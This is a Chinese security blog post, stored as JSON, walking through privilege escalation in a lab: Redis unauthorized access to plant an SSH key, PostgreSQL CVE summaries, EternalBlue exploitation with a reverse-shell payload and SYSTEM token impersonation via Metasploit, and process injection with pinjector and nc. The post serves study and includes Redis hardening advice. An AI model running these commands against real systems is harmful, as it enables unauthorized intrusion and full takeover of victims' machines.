{"title":"权限提升-数据库提权2","uid":"2b9713aac0d7c052ca172c6738a7a353","slug":"权限提升-数据库提权2","date":"2022-06-21T00:31:26.000Z","updated":"2022-06-21T15:02:52.187Z","comments":true,"path":"api/articles/权限提升-数据库提权2.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2><p>脑图：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83.png\" alt=\"数据库提权\"></p>\n<h2 id=\"0x01-Redis数据库提权\"><a href=\"#0x01-Redis数据库提权\" class=\"headerlink\" title=\"0x01 Redis数据库提权\"></a>0x01 Redis数据库提权</h2><h3 id=\"0x00-redis介绍\"><a href=\"#0x00-redis介绍\" class=\"headerlink\" title=\"0x00 redis介绍\"></a>0x00 redis介绍</h3><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。</p>\n<p>Redis因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可导致敏感信息泄露，也可以恶意执行flushall来清空所有数据。<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。</p>\n<p>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</p>\n<p>Redis默认绑定在0.0.0.0:6379，攻击者直接可以访问到，默认无密码，登录账户为root。</p>\n<h3 id=\"0x01-原理\"><a href=\"#0x01-原理\" class=\"headerlink\" title=\"0x01 原理\"></a>0x01 原理</h3><p>满足三点<br>能访问到、能登录、能写入（有root）</p>\n<ul>\n<li>开放在公网，没有和ip绑定，默认无密码</li>\n<li>root权限</li>\n<li>webshell和公私钥匙通信原理</li>\n<li>有可能把redis的默认端口6379修改</li>\n</ul>\n<h3 id=\"0x02-Redis常用命令\"><a href=\"#0x02-Redis常用命令\" class=\"headerlink\" title=\"0x02 Redis常用命令\"></a>0x02 Redis常用命令</h3><p>1、写入命令，创建备份文件：<br>config set dir &#x2F;home&#x2F;test #创建写入目录<br>config set dbfilename 1.txt #创建写入文件<br>config get dir # 查看目录是否创建成<br>config get dbfilename # 查看文件是否创建成功<br>save</p>\n<p>2、连接数据库命令：<br>redis-cli -h ip<br>ssh-keygen -t rsa #生成公私钥，密码设置为空：<br>ssh -I rsa root@ip #免密登录</p>\n<p>3、将公钥写入txt文件（为什么要把公钥写入txt文件里）：<br>(echo -e “\\n\\n”; cat id_rsa.pub; echo -e “\\n\\n”) &gt; 1.txt</p>\n<p>4、将存放公钥的txt文件写入redis服务器：</p>\n<p>cat 1.txt ｜ redis-cli -h ip -x set crack</p>\n<p>5、linux存放公私的地址：&#x2F;root&#x2F;.ssh<br>6、公钥的备份名字：authorized keys</p>\n<p>参考文章：<br><a href=\"https://www.cnblogs.com/bmjoker/p/9548962.html\">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>\n<h3 id=\"0x03-Redis常见漏洞\"><a href=\"#0x03-Redis常见漏洞\" class=\"headerlink\" title=\"0x03 Redis常见漏洞\"></a>0x03 Redis常见漏洞</h3><p>（1）利用计划任务执行命令反弹 shell</p>\n<p>（2）.写 ssh-keygen 公钥然后使用私钥登陆</p>\n<p>（3）.权限较低往 web 物理路径写 webshell</p>\n<p>最常利用的是第一种，其他两种需要以下条件才可利用：</p>\n<ul>\n<li>Redis服务使用ROOT账号启动</li>\n<li>服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。</li>\n</ul>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/fly_hps/article/details/80937837\">https://blog.csdn.net/fly_hps/article/details/80937837</a></p>\n<h3 id=\"0x04-修复方案\"><a href=\"#0x04-修复方案\" class=\"headerlink\" title=\"0x04 修复方案\"></a>0x04 修复方案</h3><p>（注意：以下操作，均需重启 Redis 后才能生效。）</p>\n<p>1、绑定需要访问数据库的 IP。 将 127.0.0.1 修改为需要访问此数据库的 IP 地址。</p>\n<p>2、设置访问密码。在 Redis.conf 中 requirepass 字段后，设置添加访问密码。</p>\n<p>3、修改 Redis 服务运行账号。以较低权限账号运行 Redis 服务，禁用账号的登录权限。</p>\n<h2 id=\"0x02-PostgreSQL-数据库权限提升\"><a href=\"#0x02-PostgreSQL-数据库权限提升\" class=\"headerlink\" title=\"0x02 PostgreSQL 数据库权限提升\"></a>0x02 PostgreSQL 数据库权限提升</h2><h3 id=\"0x00-提权方式\"><a href=\"#0x00-提权方式\" class=\"headerlink\" title=\"0x00 提权方式\"></a>0x00 提权方式</h3><p>1、低权限提权：CVE-2018-1058</p>\n<p>2、高权限命令执行漏洞：CVE-2019-9193</p>\n<p>###0x01 CVE-2018-1058</p>\n<p>原理：</p>\n<p>PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。</p>\n<p>版本：9.3-10</p>\n<p>###0x02 CVE-2019-9193</p>\n<p>原理：</p>\n<p>PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO&#x2F;FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。</p>\n<p>版本：9.3-11</p>\n<h3 id=\"0x03-漏洞复现\"><a href=\"#0x03-漏洞复现\" class=\"headerlink\" title=\"0x03 漏洞复现\"></a>0x03 漏洞复现</h3><p>利用vulhub开启环境进行漏洞复现：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621092535016.png\" alt=\"image-20220621092535016\"></p>\n<h2 id=\"0x03-令牌窃取提权\"><a href=\"#0x03-令牌窃取提权\" class=\"headerlink\" title=\"0x03 令牌窃取提权\"></a>0x03 令牌窃取提权</h2><h3 id=\"0x00-令牌简介及原理\"><a href=\"#0x00-令牌简介及原理\" class=\"headerlink\" title=\"0x00 令牌简介及原理\"></a>0x00 令牌简介及原理</h3><p>● 令牌就是系统的临时密钥，相当于账户名和密码，原来决定是否允许这次请求和判断是属于哪一个用户的，他允许你不提供密码或其他凭证的前提下访问网络和系统资源<br>● 令牌最大的特点就是随机性，不可预测，一般黑客或软件无法猜测出来<br>● 令牌有很多种：<br>访问令牌（Access Token）表示访问和控制操作主题的系统对象<br>密保令牌（Security Tocken）是一种计算机身份校验的物理设备<br>会话令牌（Session Tocken）的交互会话中唯一的身份标识符</p>\n<p>原理：进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p>\n<h3 id=\"0x01-适用范围\"><a href=\"#0x01-适用范围\" class=\"headerlink\" title=\"0x01 适用范围\"></a>0x01 适用范围</h3><p>Microsoft Windows XP Professional SP3 和之前版本</p>\n<p>Windows Server 2003 SP2 和之前的版本</p>\n<p>Windows Server 2003 x64 和 x64 SP2</p>\n<p>Windows Server 2003（用于基于 Itanium 的系统 SP2 和先前版本）</p>\n<p>Windows Server 2008 x32 x64</p>\n<p>Windows Server 2008（用于基于 Itanium 的系统）</p>\n<p>Windows Vista SP1 和之前的版本</p>\n<p>Windows Vista x64 SP1 和之前的版本</p>\n<h3 id=\"0x02-实验\"><a href=\"#0x02-实验\" class=\"headerlink\" title=\"0x02 实验\"></a>0x02 实验</h3><p><strong>攻击机kali：192.168.216.135</strong><br><strong>靶机win7：192.168.216.149</strong></p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>先扫描目标是否存在ms17-010漏洞</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621112223742.png\" alt=\"image-20220621112223742\"></p>\n<p>看到3这个模块可以利用。</p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>使用use命令使用此模块：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>查看模块配置信息：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621112444318.png\" alt=\"image-20220621112444318\"></p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>需要我们配置RHOST主机IP，之后run，运行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.216.149<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621112838455.png\" alt=\"image-20220621112838455\"></p>\n<p>可以看到目标看起来易受攻击，也就表示可能存在相关漏洞。</p>\n<h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><p>查找攻击模块：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621113247544.png\" alt=\"image-20220621113247544\"></p>\n<p>选择第0个永恒之蓝。</p>\n<h3 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h3><p>同样，使用use命令加载模块，之后show options：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621113509964.png\" alt=\"image-20220621113509964\"></p>\n<h3 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h3><p>设置目标主机ip之后run运行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">set RHOSTS 192.168.216.149<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621114010986.png\" alt=\"image-20220621114010986\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621114036064.png\" alt=\"image-20220621114036064\"></p>\n<p>可以看到已经获取到了权限。（本意不在这里）</p>\n<h3 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h3><p>继续从设置ip处开始：</p>\n<p>找一个payload：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; search windows&#x2F;x64&#x2F;shell type:payload<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621114548125.png\" alt=\"image-20220621114548125\"></p>\n<p>挑选第3个反弹shell的payloads：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set payload windows&#x2F;x64&#x2F;shell&#x2F;reverse_tcp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621115308944.png\" alt=\"image-20220621115308944\"></p>\n<h3 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h3><p>设置一下本机payload监听地址：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set LHOST 192.168.216.135<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>配置完成后exploit开始执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">msf6 &gt; exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621120549744.png\" alt=\"image-20220621120549744\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621120605108.png\" alt=\"image-20220621120605108\"></p>\n<p>拿到了权限。（直接是system权限，无语，后面的令牌窃取继续执行）</p>\n<h3 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h3><p>先执行<code>use incognito</code>命令，然后输入<code>list_tokens -u</code>列出可用的token：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621121251702.png\" alt=\"image-20220621121251702\"></p>\n<h3 id=\"0x12\"><a href=\"#0x12\" class=\"headerlink\" title=\"0x12\"></a>0x12</h3><p>使用<code>impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</code>命令窃取令牌，执行shell命令弹出shell：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621121512359.png\" alt=\"image-20220621121512359\"></p>\n<p>获取系统权限。</p>\n<h2 id=\"0x04-进程注入提权\"><a href=\"#0x04-进程注入提权\" class=\"headerlink\" title=\"0x04 进程注入提权\"></a>0x04 进程注入提权</h2><h3 id=\"0x00-原理\"><a href=\"#0x00-原理\" class=\"headerlink\" title=\"0x00 原理\"></a>0x00 原理</h3><p>进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化。</p>\n<p><strong>使用 pinjector.exe 注入到system用户的进程中，使该进程绑定在0.0.0.0:port ，并建立监听端口，攻击者从攻击机上主动连接该地址，获取到系统的system权限。</strong></p>\n<h3 id=\"0x01-适用范围-1\"><a href=\"#0x01-适用范围-1\" class=\"headerlink\" title=\"0x01 适用范围\"></a>0x01 适用范围</h3><p>适用于windows2008 之前的操作系统。</p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>上传 pinjector.exe到靶机，执行<code>pinjector.exe -l</code>命令列出所有进程：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621144009412.png\" alt=\"image-20220621144009412\"></p>\n<h3 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>选择一个system权限运行的进程，对此pid进程执行注入，并建立侦听端口：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行命令：pinjector.exe -p &lt;pid&gt; cmd &lt;port&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621144121738.png\" alt=\"image-20220621144121738\"></p>\n<h3 id=\"0x04-1\"><a href=\"#0x04-1\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>使用 nc 连接目标服务器端口：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">执行命令：nc -nv 192.168.0.117 5555<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%832.htm/image-20220621144218702.png\" alt=\"image-20220621144218702\"></p>\n<p>连接成功，系统权限。</p>\n<p>###0x05</p>\n<p>进程注入工具下载地址：</p>\n<p><a href=\"https://www.tarasco.org/security/Process_Injector/processinjector.zip\">https://www.tarasco.org/security/Process_Injector/processinjector.zip</a></p>\n","text":"0x00脑图： 0x01 Redis数据库提权0x00 redis介绍Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从20...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00\"><span class=\"toc-text\">0x00</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-Redis%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x01 Redis数据库提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-redis%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">0x00 redis介绍</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">0x01 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-Redis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4\"><span class=\"toc-text\">0x02 Redis常用命令</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-Redis%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">0x03 Redis常见漏洞</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88\"><span class=\"toc-text\">0x04 修复方案</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-PostgreSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87\"><span class=\"toc-text\">0x02 PostgreSQL 数据库权限提升</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">0x00 提权方式</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">0x03 漏洞复现</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x03 令牌窃取提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E4%BB%A4%E7%89%8C%E7%AE%80%E4%BB%8B%E5%8F%8A%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">0x00 令牌简介及原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4\"><span class=\"toc-text\">0x01 适用范围</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E5%AE%9E%E9%AA%8C\"><span class=\"toc-text\">0x02 实验</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x09\"><span class=\"toc-text\">0x09</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x10\"><span class=\"toc-text\">0x10</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x11\"><span class=\"toc-text\">0x11</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x12\"><span class=\"toc-text\">0x12</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x04 进程注入提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">0x00 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4-1\"><span class=\"toc-text\">0x01 适用范围</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-1\"><span class=\"toc-text\">0x04</span></a></li></ol></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"权限提升-windows提权2","uid":"c0a50503f3bb03b0879376d7c8e571c3","slug":"权限提升-windows提权2","date":"2022-06-21T15:02:18.000Z","updated":"2022-06-22T16:00:24.862Z","comments":true,"path":"api/articles/权限提升-windows提权2.json","keywords":null,"cover":[],"text":"0x00 RottenPotato(烂土豆)配合令牌窃取提权0x00 原理1.欺骗“NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。 2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个...","link":"","photos":[],"count_time":{"symbolsCount":"3.6k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"权限提升-数据库提权1","uid":"1989a1e5dad512659756c4dce4a56243","slug":"权限提升-数据库提权1","date":"2022-06-20T08:13:30.000Z","updated":"2022-06-21T00:44:39.773Z","comments":true,"path":"api/articles/权限提升-数据库提权1.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 数据库提权的意义及流程1、意义：在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权；但需要知道数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码。除 Access 数据库外，其他数据库基本都存在数据库提权的可能。 2、流程 ：服务探针...","link":"","photos":[],"count_time":{"symbolsCount":"3.8k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}